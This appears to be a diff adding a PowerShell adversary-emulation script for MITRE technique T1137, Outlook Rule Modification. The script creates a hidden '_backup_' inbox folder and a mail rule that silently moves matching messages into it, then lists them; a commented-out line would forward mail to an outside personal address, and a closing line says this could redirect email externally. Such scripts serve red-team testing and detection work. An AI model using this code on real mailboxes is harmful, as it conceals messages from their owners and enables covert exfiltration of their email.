@@ -1,0 +1,64 @@
+# T1137 Outlook Rule Modification
+# Miscreant could create a outlook rule to hide messages in a folder or delete them...
+
+$emailAddress = "email@email.com"   # Targetted Email Address
+ 
+Add-Type -assembly "Microsoft.Office.Interop.Outlook"
+$Outlook = New-Object -comobject Outlook.Application
+$namespace = $Outlook.GetNameSpace("MAPI")
+ 
+"`r`nRules Currently in Outlook"
+$ruleExists = "False"
+$currentRules = $namespace.DefaultStore.GetRules()
+ForEach ($rule in $currentRules) {
+    $rule.Name
+    If ($rule.Name -eq "Move to Backup Folder - Scenario") {
+        $ruleExists = "True"
+	}
+}
+ 
+ 
+$folderInbox = $namespace.Folders.Item($emailAddress).Folders.Item('Inbox')
+$folderExists = "False"
+ForEach ($f in $folderInbox.Folders) {
+    If ($f.Name -eq "_backup_") { $folderExists = "True" }
+}
+If ($folderExists -eq "False") {
+    "`r`nCreated a New Folder _backup_ in the Inbox for Emails sent to sophia.noorda@yahoo.com"
+    $folderInbox.Folders.Add('_backup_') | Out-Null
+}
+Else {
+    "`r`nFolder _backup_ already exists in Inbox for Emails sent to sophia.noorda@yahoo.com"
+}
+ 
+If ($ruleExists -eq "False") {
+    "Created a Rule to Copy Emails with a Subject of 'Scenario Phishing - Demo' to _backup_ Folder"
+    $backupFolder = $namespace.Folders.Item($emailAddress).Folders.Item('Inbox').Folders.Item('_backup_')
+    $rule = $currentRules.create("Move to Backup Folder - Scenario", [Microsoft.Office.Interop.Outlook.OlRuleType]::olRuleReceive)
+    $rule_body = $rule.Conditions.Subject
+    $rule_body.Enabled = $true
+    $rule_body.Text = @('Scenario Phishing - Demo')
+    $action = $rule.Actions.MovetoFolder
+    #$action += $rule.Actions.Forward.Recipients('sophia.noorda@yahoo.com')
+    $action.Enabled = $true
+    [Microsoft.Office.Interop.Outlook._MoveOrCopyRuleAction].InvokeMember("Folder", [System.Reflection.BindingFlags]::SetProperty, $null, $action, $backupFolder)
+    $currentRules.Save()
+ 
+   
+}
+Else {
+    "Rule exists to Copy Emails with a Subject of 'Scenario Phishing - Demo' to _backup_ Folder"
+}
+ 
+"Display the subjects of the emails in the _backup_ Folder"
+ 
+ForEach ($email in $namespace.Folders.Item($emailAddress).Folders.Item('Inbox').Folders.Item('_backup_').Items) {
+    $senderName = $email.SenderName
+    $subject = $email.Subject
+    $receivedTime = $email.ReceivedTime
+    "$($senderName) - $($subject) - $($receivedTime)"
+}
+ 
+"`r`nThis could redirect the email to an outside email address."
+ 
+ 
